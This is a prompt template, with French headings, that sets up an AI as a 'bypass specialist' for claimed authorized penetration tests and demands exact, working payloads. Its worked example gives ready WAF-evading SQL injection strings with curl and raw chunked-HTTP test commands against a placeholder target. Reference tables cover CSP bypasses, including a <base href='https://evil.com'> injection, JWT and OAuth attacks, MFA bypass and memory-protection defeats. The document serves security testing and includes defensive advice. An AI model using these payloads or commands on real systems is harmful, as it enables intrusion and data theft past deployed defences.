# Exploit Bypass Techniques

## Quand utiliser ce prompt

Utiliser ce prompt lorsque vous avez identifie une vulnerabilite mais que son exploitation est bloquee par un mecanisme de securite (WAF, CSP, ASLR, authentification, rate limiting, sandbox). Ce prompt vous aide a analyser le mecanisme de protection en place et a identifier des techniques de contournement documentees et testees. Il couvre les bypass de WAF (encodage, HTTP smuggling, HPP), les bypass de CSP (JSONP, script gadgets, base-uri), les bypass ASLR/DEP pour les exploits binaires, les bypass d'authentification (manipulation de tokens, race conditions), les bypass de rate limiting, et les escape de sandbox (container, VM, navigateur). A utiliser apres avoir identifie la protection specifique qui bloque l'exploitation.

## Variables a remplir

| Variable | Description | Exemple |
|----------|-------------|---------|
| `{{PROTECTION_TYPE}}` | Type de protection a contourner | `WAF (Cloudflare Enterprise)` |
| `{{PROTECTION_DETAILS}}` | Configuration et details de la protection | `Cloudflare Enterprise WAF with OWASP CRS ruleset, managed rules enabled, security level High, challenge on suspicious requests` |
| `{{VULN_TYPE}}` | Vulnerabilite sous-jacente a exploiter | `SQL Injection in search parameter` |
| `{{BLOCKED_BEHAVIOR}}` | Comportement observe lors du blocage | `403 Forbidden with Cloudflare error page when payload contains UNION SELECT or OR 1=1` |
| `{{TARGET}}` | Cible autorisee | `https://app.target.example.com` |
| `{{SCOPE}}` | Contraintes du perimetre | `No denial of service, no brute force exceeding 100 req/min` |
| `{{CONTEXT}}` | Contexte technique detaille | `Application behind Cloudflare proxy, backend is PHP 8.1 with MySQL 8.0, Linux x86_64` |
| `{{TECH_STACK}}` | Stack technique | `PHP 8.1, MySQL 8.0, Apache 2.4, Cloudflare CDN/WAF, Linux Ubuntu 22.04` |
| `{{CURRENT_PAYLOAD}}` | Payload actuel qui est bloque | `' UNION SELECT username,password FROM users--` |
| `{{BINARY_TARGET}}` | Binaire cible pour les bypass memoire (si applicable) | `Custom C application, compiled with GCC 12, PIE enabled, NX bit, stack canaries` |

---

## System Prompt

```
You are a senior security researcher and bypass specialist with deep expertise in circumventing security controls across all layers of the technology stack. You have presented at DEF CON, Black Hat, and published research on WAF bypass, CSP bypass, ASLR/DEP defeat, authentication mechanism weaknesses, and sandbox escape techniques.

Your expertise covers:

WEB APPLICATION FIREWALLS:
- Deep knowledge of Cloudflare, AWS WAF, ModSecurity (CRS v3/v4), Akamai Kona, Imperva/Incapsula, F5 ASM, Fortinet FortiWeb
- Encoding bypass: URL encoding, double encoding, Unicode normalization attacks, overlong UTF-8, charset manipulation
- Protocol-level bypass: HTTP request smuggling (CL.TE, TE.CL, TE.TE), chunked transfer abuse, HTTP/2 downgrade, multipart boundary manipulation
- Parameter-level bypass: HTTP Parameter Pollution (HPP), JSON/XML content type switching, array parameter injection, parameter name variation

CONTENT SECURITY POLICY:
- CSP directive analysis and weakness identification
- Script gadget discovery in CSP-allowed origins
- JSONP endpoint abuse on whitelisted domains
- AngularJS sandbox escape via CSP-allowed angular.js
- base-uri injection for relative URL hijacking
- Nonce/hash prediction or leakage
- style-src abuse for data exfiltration

MEMORY PROTECTIONS (Binary):
- ASLR bypass: information leaks, partial overwrite, brute force (32-bit), format string leaks
- DEP/NX bypass: ROP chain construction, ret2libc, ret2plt, sigreturn-oriented programming (SROP)
- Stack canary bypass: information leaks, canary brute force (fork servers), format string reads
- CFI bypass: COOP (Counterfeit Object-Oriented Programming), DOP (Data-Oriented Programming)
- PIE bypass: partial overwrite, GOT overwrite when combined with info leak

AUTHENTICATION:
- JWT attacks: none algorithm, key confusion (RS256->HS256), weak secret brute force, kid injection
- Session management: session fixation, session puzzle, concurrent session race conditions
- OAuth/OIDC: redirect_uri manipulation, state parameter bypass, token leakage via referrer
- MFA bypass: race conditions, backup code prediction, SIM swap (out of scope for testing)
- Parameter tampering: role manipulation, privilege fields in registration/update requests

RATE LIMITING:
- IP-based bypass: X-Forwarded-For manipulation, X-Real-IP, True-Client-IP, custom headers
- Identifier variation: parameter case change, trailing dots, URL encoding in identifiers
- Endpoint variation: path case variation, trailing slashes, HTTP method switching
- Distributed approaches: IP rotation through proxy pools (when authorized)

SANDBOX ESCAPE:
- Container escape: privileged containers, kernel exploits, mounted Docker socket, cgroup escape
- Browser sandbox: renderer exploits, IPC bugs, Mojo interface abuse
- VM escape: virtual device driver bugs, shared memory attacks, VM-specific CVEs

Your rules:
1. ONLY recommend bypass techniques that are technically sound and documented
2. For each technique, explain the EXACT mechanism - why does it work?
3. Provide the technical analysis of how the protection works before explaining how to bypass it
4. Rate each bypass by reliability: Proven (tested in the real world), Documented (in research papers), Theoretical (logical but untested)
5. NEVER recommend denial of service as a bypass technique
6. NEVER generate destructive payloads
7. If a protection is properly implemented with no known bypass, SAY SO honestly
8. Mark version-specific bypasses with the exact versions they affect
9. Do NOT hallucinate WAF rule IDs, CVE numbers, or bypass techniques. If uncertain, state it.
10. For binary exploits, provide technique descriptions and skeleton code, not weaponized exploits
```

---

## User Prompt

```
<context>
During an authorized penetration test, I have identified a vulnerability but exploitation is blocked by a security control. I need to identify viable bypass techniques for the specific protection in place.

Target: {{TARGET}}
Scope: {{SCOPE}}
Technical context: {{CONTEXT}}
Technology stack: {{TECH_STACK}}
</context>

<target>
Protection to bypass: {{PROTECTION_TYPE}}
Protection configuration details: {{PROTECTION_DETAILS}}
Underlying vulnerability: {{VULN_TYPE}}
Observed blocking behavior: {{BLOCKED_BEHAVIOR}}
Current blocked payload: {{CURRENT_PAYLOAD}}
Binary target details (if applicable): {{BINARY_TARGET}}
</target>

<instructions>
Analyze the security control and identify bypass techniques following this exact methodology:

STEP 1 - THINKING BLOCK (mandatory):
<thinking>
Phase 1 - PROTECTION ANALYSIS:
- How does this specific protection work? What is its inspection model?
- What is the processing order? (e.g., WAF inspects -> application decodes -> parser processes)
- What does it look for? (signatures, patterns, behavioral anomalies, rate thresholds)
- What does it NOT inspect? (specific content types, HTTP methods, encoding layers, specific parameters)
- Known weaknesses in this specific product/version?

Phase 2 - BYPASS SURFACE MAPPING:
- What encoding/transformation layers exist between attacker input and vulnerable parser?
- Where in the processing pipeline can we introduce discrepancies between what the protection sees and what the application processes?
- Are there protocol-level bypasses applicable? (HTTP smuggling, HTTP/2, WebSocket upgrade)
- Are there application-level bypasses? (alternate input channels, different HTTP methods, different content types)

Phase 3 - TECHNIQUE SELECTION:
- For each candidate bypass, trace the payload through the entire pipeline
- Assess reliability: is this bypass version-specific? configuration-specific?
- Rank by likelihood of success given the specific protection details provided
- Consider combining multiple techniques if a single bypass is insufficient

Phase 4 - SAFETY ASSESSMENT:
- Does the bypass technique have any destructive side effects?
- Could the bypass technique trigger additional security alerts?
- Is the technique within the authorized scope?
</thinking>

STEP 2 - Generate the bypass analysis:

For each viable bypass technique:
a) TECHNIQUE OVERVIEW: Name, category, reliability rating
b) MECHANISM: Detailed explanation of why this bypass works against this specific protection
c) PAYLOAD: The modified payload using this bypass technique
d) TESTING PROCEDURE: Step-by-step commands to test the bypass
e) DETECTION RISK: Likelihood that the bypass itself is detected
f) LIMITATIONS: When this bypass will NOT work

STEP 3 - Provide a layered bypass strategy:
If no single technique is sufficient, provide a combination approach.
</instructions>

<output_format>
Return a JSON object with this exact structure:
{
  "protection_analysis": {
    "protection_type": "string - category of protection",
    "product": "string - specific product name and version if known",
    "inspection_model": "string - how the protection inspects traffic",
    "processing_order": "string - order of processing in the full pipeline",
    "known_limitations": ["list of documented limitations or blind spots"],
    "detection_signatures": ["list of patterns/signatures the protection likely uses for this vuln class"]
  },
  "bypass_techniques": [
    {
      "technique_id": "string - BYP-001, BYP-002, etc.",
      "technique_name": "string - descriptive name",
      "category": "string - Encoding/Protocol/Parameter/Logic/Memory/Auth",
      "reliability": "string - Proven/Documented/Theoretical",
      "affected_versions": "string - specific versions this bypass works against, or 'All known versions'",
      "mechanism": "string - detailed explanation of how and why this bypass works",
      "processing_trace": {
        "attacker_sends": "string - what the attacker sends",
        "protection_sees": "string - what the protection interprets",
        "protection_decision": "string - allow/block and why",
        "application_receives": "string - what the application processes",
        "parser_executes": "string - what the vulnerable parser ultimately processes"
      },
      "payload": {
        "raw": "string - the bypass payload",
        "encoded": "string - URL/transport encoded version",
        "explanation": "string - annotation of each part of the payload"
      },
      "testing_procedure": [
        {
          "step": 1,
          "description": "string - what to do",
          "command": "string - curl command or tool usage",
          "expected_if_bypassed": "string - response indicating bypass success",
          "expected_if_blocked": "string - response indicating bypass failure"
        }
      ],
      "detection_risk": "string - Low/Medium/High with explanation",
      "limitations": "string - conditions where this bypass fails",
      "references": ["list of URLs or papers documenting this technique"]
    }
  ],
  "combined_strategy": {
    "description": "string - how to combine multiple techniques for maximum effectiveness",
    "technique_order": ["list of technique_ids in order of application"],
    "combined_payload": "string - payload using multiple bypass techniques together",
    "combined_reliability": "string - overall reliability estimate"
  },
  "defense_perspective": {
    "what_makes_this_protection_strong": "string - what the protection does well",
    "configuration_improvements": ["list of configuration changes that would block these bypasses"],
    "additional_controls": ["list of supplementary controls that would mitigate the risk"]
  },
  "safety_assessment": {
    "destructive_potential": "string - None/Low/Medium/High",
    "scope_compliance": "string - confirmation that all techniques are within scope",
    "side_effects": ["list of potential side effects"]
  },
  "confidence_level": "string - overall confidence with reasoning"
}
</output_format>

<constraints>
- Only recommend bypass techniques that are technically sound
- Provide exact payloads, not pseudocode or descriptions of payloads
- For binary exploits, provide technique descriptions and skeleton code, not full weaponized exploits
- All payloads must remain non-destructive (read-only demonstration)
- If no bypass is known for a properly configured protection, state this honestly
- Mark version-specific bypasses with exact affected versions
- Mark theoretical/untested bypasses with [THEORETICAL]
- Do not fabricate CVE numbers, WAF rule IDs, or research paper titles
- Trace every payload through the full processing pipeline to verify the bypass logic
- Rate limiting bypass must not exceed the scope's authorized request rate
- Sandbox escape techniques should focus on identifying the escape vector, not providing a full weaponized exploit
</constraints>
```

---

## Prefill (assistant)

```
{
  "protection_analysis": {
    "protection_type": "
```

---

## Few-shot Examples

### Example 1: WAF Bypass for SQL Injection (Cloudflare)

**Input variables:**
- `{{PROTECTION_TYPE}}`: `WAF (Cloudflare Enterprise)`
- `{{PROTECTION_DETAILS}}`: `Cloudflare Enterprise with OWASP CRS managed rules, paranoia level 2, anomaly scoring threshold 5`
- `{{VULN_TYPE}}`: `SQL Injection (UNION-based) in search parameter`
- `{{BLOCKED_BEHAVIOR}}`: `403 Forbidden with Cloudflare ray ID when payload contains: UNION SELECT, OR 1=1, ' OR ', information_schema, version()`
- `{{CURRENT_PAYLOAD}}`: `' UNION SELECT username,password FROM users-- -`
- `{{TECH_STACK}}`: `PHP 8.1, MySQL 8.0, Apache 2.4 behind Cloudflare`

**Expected output (abbreviated):**

```json
{
  "protection_analysis": {
    "protection_type": "Web Application Firewall",
    "product": "Cloudflare Enterprise WAF with OWASP CRS",
    "inspection_model": "Cloudflare inspects HTTP request parameters, headers, body, and URL at the edge. It applies signature-based matching (managed rules) and anomaly scoring (OWASP CRS). At paranoia level 2, it inspects URL-decoded parameters, detects common SQL keywords (UNION, SELECT, OR, AND), SQL functions (version(), database()), and metadata access (information_schema). Anomaly scoring sums rule matches; threshold of 5 means multiple low-score matches can trigger blocking.",
    "processing_order": "Client -> Cloudflare Edge (WAF inspection on URL-decoded input) -> Origin (Apache URL-decode -> PHP parameter processing -> MySQL query)",
    "known_limitations": [
      "May not fully inspect HTTP/2 pseudo-headers in all configurations",
      "JSON body inspection depends on Content-Type header being set correctly",
      "Chunked transfer encoding may not be fully reconstructed before inspection in some edge cases",
      "Unicode normalization differences between Cloudflare inspection and MySQL processing",
      "HPP behavior differences between Cloudflare (may inspect first param) and PHP (uses last param)"
    ],
    "detection_signatures": [
      "SQL keywords: UNION, SELECT, INSERT, UPDATE, DELETE, DROP, EXEC",
      "SQL operators: OR followed by comparison, AND followed by comparison",
      "SQL functions: version(), database(), user(), concat(), group_concat()",
      "SQL metadata: information_schema, mysql.user, sys.tables",
      "Common patterns: ' OR '1'='1, ' UNION SELECT, '; DROP TABLE"
    ]
  },
  "bypass_techniques": [
    {
      "technique_id": "BYP-001",
      "technique_name": "MySQL version-specific comment bypass",
      "category": "Encoding",
      "reliability": "Proven",
      "affected_versions": "Cloudflare with OWASP CRS paranoia level 1-2. May be detected at PL3+.",
      "mechanism": "MySQL supports version-conditional comments with the syntax /*!50000KEYWORD*/. MySQL 5.0+ will execute the content as SQL, but the WAF sees it as a comment and may not inspect the content. The version number 50000 means 'execute if MySQL version >= 5.0.0'. This breaks the UNION SELECT signature because the WAF sees /*!50000UNION*/ as a comment, not a keyword.",
      "processing_trace": {
        "attacker_sends": "' /*!50000UNION*/ /*!50000SELECT*/ username,password FROM users-- -",
        "protection_sees": "String with MySQL comments containing the word UNION and SELECT. At PL2, Cloudflare may or may not flag version comments. The UNION SELECT signature is broken because the keywords are inside comments.",
        "protection_decision": "ALLOW (if the comment-based UNION/SELECT rule is not in the active managed ruleset at this PL)",
        "application_receives": "' /*!50000UNION*/ /*!50000SELECT*/ username,password FROM users-- -",
        "parser_executes": "MySQL 8.0 strips the comment markers and executes: ' UNION SELECT username,password FROM users-- -"
      },
      "payload": {
        "raw": "' /*!50000UNION*/ /*!50000SELECT*/ username,password FROM users-- -",
        "encoded": "'%20/*!50000UNION*/%20/*!50000SELECT*/%20username,password%20FROM%20users--%20-",
        "explanation": "/*!50000 ... */ is MySQL version-conditional comment. The WAF may not associate UNION and SELECT as SQL keywords when wrapped in comments. MySQL 8.0 (>= 5.0.0) executes the content."
      },
      "testing_procedure": [
        {
          "step": 1,
          "description": "Test if MySQL version comments pass the WAF",
          "command": "curl -v 'https://app.target.example.com/search?q=%27%20/*!50000UNION*/%20/*!50000SELECT*/%201,2,3--%20-'",
          "expected_if_bypassed": "200 OK with SQL results or error message (not 403)",
          "expected_if_blocked": "403 Forbidden with Cloudflare error page"
        },
        {
          "step": 2,
          "description": "If step 1 passes, extract database version as proof",
          "command": "curl -s 'https://app.target.example.com/search?q=%27%20/*!50000UNION*/%20/*!50000SELECT*/%20version(),2,3--%20-'",
          "expected_if_bypassed": "Response containing MySQL version string (e.g., 8.0.32)",
          "expected_if_blocked": "403 Forbidden"
        }
      ],
      "detection_risk": "Medium - Cloudflare may update managed rules to detect this pattern. Also, the /*!50000 pattern itself can be flagged by newer rulesets.",
      "limitations": "Modern Cloudflare managed rules (2024+) at PL2+ may specifically detect MySQL version comments. This bypass is less reliable against recently updated rulesets.",
      "references": ["https://portswigger.net/web-security/sql-injection/cheat-sheet", "OWASP CRS documentation on SQL injection rules"]
    },
    {
      "technique_id": "BYP-002",
      "technique_name": "HTTP Parameter Pollution (HPP) with PHP last-param wins",
      "category": "Parameter",
      "reliability": "Documented",
      "affected_versions": "Depends on Cloudflare configuration. Works when WAF inspects only the first occurrence of a duplicated parameter.",
      "mechanism": "When a parameter appears multiple times in a query string, different technologies handle it differently. PHP uses the LAST occurrence (e.g., ?q=safe&q=malicious -> PHP sees q=malicious). If Cloudflare inspects the FIRST occurrence, we can put a benign value first and the malicious payload second.",
      "processing_trace": {
        "attacker_sends": "?q=safe_search_term&q=' UNION SELECT username,password FROM users-- -",
        "protection_sees": "First parameter value: 'safe_search_term' - no malicious content detected (if WAF only inspects first occurrence)",
        "protection_decision": "ALLOW (inspects benign first parameter)",
        "application_receives": "PHP $_GET['q'] = ' UNION SELECT username,password FROM users-- -' (last occurrence wins)",
        "parser_executes": "MySQL receives the injected UNION SELECT query"
      },
      "payload": {
        "raw": "q=test&q=' UNION SELECT username,password FROM users-- -",
        "encoded": "q=test&q='%20UNION%20SELECT%20username,password%20FROM%20users--%20-",
        "explanation": "First q=test is benign and satisfies WAF inspection. Second q= contains the actual payload. PHP will use the second (last) value."
      },
      "testing_procedure": [
        {
          "step": 1,
          "description": "Verify PHP uses the last parameter value",
          "command": "curl -s 'https://app.target.example.com/search?q=FIRST&q=SECOND' | grep -o 'FIRST\\|SECOND'",
          "expected_if_bypassed": "Response references 'SECOND' (PHP uses last param)",
          "expected_if_blocked": "N/A - this tests application behavior, not WAF"
        },
        {
          "step": 2,
          "description": "Test HPP bypass with SQL injection payload",
          "command": "curl -v 'https://app.target.example.com/search?q=test&q=%27%20UNION%20SELECT%20version(),2,3--%20-'",
          "expected_if_bypassed": "200 OK with SQL injection results",
          "expected_if_blocked": "403 Forbidden"
        }
      ],
      "detection_risk": "Low - HPP looks like normal duplicate parameter handling. However, modern WAFs may inspect all parameter occurrences.",
      "limitations": "Modern Cloudflare configurations inspect ALL occurrences of duplicated parameters. This bypass is increasingly unreliable against updated WAF configurations.",
      "references": ["OWASP HPP documentation", "HTTP Parameter Pollution research by Luca Carettoni and Stefano di Paola"]
    },
    {
      "technique_id": "BYP-003",
      "technique_name": "Chunked Transfer Encoding body splitting",
      "category": "Protocol",
      "reliability": "Documented",
      "affected_versions": "Older Cloudflare configurations. Modern Cloudflare reconstructs chunked bodies before inspection.",
      "mechanism": "By using Transfer-Encoding: chunked, the request body is split into multiple chunks. If the WAF inspects each chunk individually without reconstructing the full body, SQL keywords split across chunks are not detected. For example, 'UNI' in chunk 1 and 'ON SELECT' in chunk 2.",
      "processing_trace": {
        "attacker_sends": "POST with Transfer-Encoding: chunked, body split so 'UNION' spans two chunks",
        "protection_sees": "Chunk 1: q=' UNI (incomplete keyword), Chunk 2: ON SELECT... (does not match full signature)",
        "protection_decision": "ALLOW (if WAF does not reassemble chunks before inspection)",
        "application_receives": "Apache/PHP reassembles the full body: q=' UNION SELECT...",
        "parser_executes": "Full UNION SELECT query executes on MySQL"
      },
      "payload": {
        "raw": "Transfer-Encoding: chunked\\r\\n\\r\\n7\\r\\nq=' UNI\\r\\n15\\r\\nON SELECT version()\\r\\n0\\r\\n\\r\\n",
        "encoded": "N/A - raw HTTP required",
        "explanation": "The keyword UNION is split across chunk boundary (UNI | ON). WAF cannot match the UNION keyword in either chunk individually."
      },
      "testing_procedure": [
        {
          "step": 1,
          "description": "Send chunked request with split SQL keyword",
          "command": "printf 'POST /search HTTP/1.1\\r\\nHost: app.target.example.com\\r\\nTransfer-Encoding: chunked\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\n7\\r\\nq=%%27+UNI\\r\\n18\\r\\nON+SELECT+version(),2,3\\r\\n0\\r\\n\\r\\n' | openssl s_client -connect app.target.example.com:443 -quiet",
          "expected_if_bypassed": "HTTP 200 with SQL results in response body",
          "expected_if_blocked": "HTTP 403 from Cloudflare"
        }
      ],
      "detection_risk": "Low - chunked encoding is legitimate HTTP. However, the use of chunked encoding for small bodies may itself be suspicious.",
      "limitations": "Modern Cloudflare (2023+) reassembles chunked bodies before WAF inspection. This bypass is largely mitigated in current deployments. [MANUAL_VERIFICATION required]",
      "references": ["HTTP Request Smuggling research by James Kettle (PortSwigger)", "DEF CON 24 - Regilero HTTP Smuggling"]
    }
  ],
  "combined_strategy": {
    "description": "Combine MySQL version comments (BYP-001) with whitespace alternatives (tab characters %09 instead of spaces) and case variation for maximum evasion. This layers encoding bypass with signature disruption.",
    "technique_order": ["BYP-001"],
    "combined_payload": "'%09/*!50000UnIoN*/%09/*!50000SeLeCt*/%09version(),2,3--%09-",
    "combined_reliability": "Medium - each layer adds evasion but also increases the chance of triggering anomaly scoring. Test incrementally."
  },
  "defense_perspective": {
    "what_makes_this_protection_strong": "Cloudflare Enterprise with OWASP CRS at PL2 provides strong baseline protection against common SQL injection patterns. Anomaly scoring means even partial matches contribute to blocking. Managed rules are regularly updated with new signatures.",
    "configuration_improvements": [
      "Increase paranoia level to 3 or 4 to detect comment-based bypasses",
      "Enable all managed rules for SQL injection category",
      "Configure Cloudflare to inspect all parameter occurrences (not just first)",
      "Enable body reconstruction for chunked transfer encoding before WAF inspection"
    ],
    "additional_controls": [
      "Implement parameterized queries/prepared statements at the application level (eliminates the vulnerability entirely)",
      "Deploy a secondary WAF or RASP at the application level for defense in depth",
      "Implement database user privilege restrictions (principle of least privilege)",
      "Enable database audit logging for suspicious query patterns"
    ]
  },
  "safety_assessment": {
    "destructive_potential": "None - all bypass payloads use SELECT only (version(), current_user()). No data modification.",
    "scope_compliance": "All techniques are within scope: no DoS, no brute force, no data exfiltration of sensitive information.",
    "side_effects": ["WAF logs will record the bypass attempts", "Database slow query log may capture the injected queries", "Cloudflare analytics will show the blocked vs. allowed requests"]
  },
  "confidence_level": "Medium - MySQL version comment bypass (BYP-001) is a well-documented technique but its effectiveness depends on the specific Cloudflare managed ruleset version. HPP (BYP-002) is less reliable against modern configurations. Chunked encoding (BYP-003) is largely mitigated. Recommend testing BYP-001 first and adapting based on results."
}
```

### Example 2: CSP Bypass Techniques Reference

**Common CSP bypass patterns for the thinking block:**

| CSP Directive | Bypass Technique | Requirements |
|---|---|---|
| `script-src 'self'` | Upload a JS file to the same origin (file upload + path traversal) | File upload feature on the same domain |
| `script-src cdn.example.com` | Find JSONP endpoint on cdn.example.com | JSONP callback on allowed domain |
| `script-src 'self' 'unsafe-eval'` | DOM XSS via eval(), setTimeout(), new Function() | XSS in JS context |
| `script-src 'self' https://cdnjs.cloudflare.com` | Load AngularJS from cdnjs + template injection | No ng-app directive needed if you inject it |
| `script-src 'nonce-xxx'` | Nonce leak via CSS injection or DOM access | Ability to read the page DOM before CSP applies |
| `base-uri not set` | Inject `<base href="https://evil.com">` to redirect relative script URLs | XSS in head or before script tags |
| `default-src 'self'` | WebSocket to attacker (ws:// not covered by connect-src if only default-src is set) | WebSocket support in browser |
| `script-src 'strict-dynamic'` | Create scripts via allowed script (parser-inserted vs. non-parser-inserted) | Existing allowed script that creates new script elements |

### Example 3: Authentication Bypass Patterns Reference

| Auth Mechanism | Bypass Technique | Description |
|---|---|---|
| JWT (none algorithm) | Change alg to "none", remove signature | Works if server does not validate alg field |
| JWT (RS256/HS256 confusion) | Change alg from RS256 to HS256, sign with public key | Works if server uses same key for verify regardless of alg |
| JWT (weak secret) | Brute force HMAC secret with hashcat/john | Works if secret is in common wordlists |
| JWT (kid injection) | Set kid header to SQL injection or path traversal | Works if kid is used in DB query or file read without sanitization |
| OAuth (redirect_uri) | Manipulate redirect_uri to open redirect or attacker domain | Works if redirect_uri validation is incomplete (path traversal, subdomain) |
| Session fixation | Set session cookie before auth, check if same session post-auth | Works if server does not regenerate session on login |
| Race condition | Send concurrent password change + login requests | Works if session/auth state is not atomic |
| Password reset | Manipulate Host header for reset link poisoning | Works if app uses Host header to build reset URL |
| MFA bypass | Access API endpoints directly (MFA only enforced on UI) | Works if MFA check is only in the frontend |
| Role manipulation | Modify role/isAdmin parameter in registration or profile update | Works if server trusts client-side role values |

### Example 4: ASLR/DEP Bypass Skeleton Reference

| Protection | Bypass | Prerequisite |
|---|---|---|
| ASLR (full) | Format string info leak to read stack/libc addresses | Format string vulnerability |
| ASLR (partial, 32-bit) | Brute force (256-4096 attempts) | Fork-based server (address space preserved) |
| ASLR + PIE | Partial overwrite (only overwrite lowest 12 bits which are not randomized) | Buffer overflow with controlled size |
| DEP/NX | ROP chain using gadgets from non-ASLR module or leaked libc base | Known libc version + base address |
| Stack canary | Fork server canary brute force (byte-by-byte) | Fork-based server, byte-by-byte overflow control |
| Stack canary | Format string read of canary value from stack | Format string vulnerability |
| CFI | Data-Oriented Programming (DOP) - manipulate data without control flow hijack | Multiple write primitives to data variables |
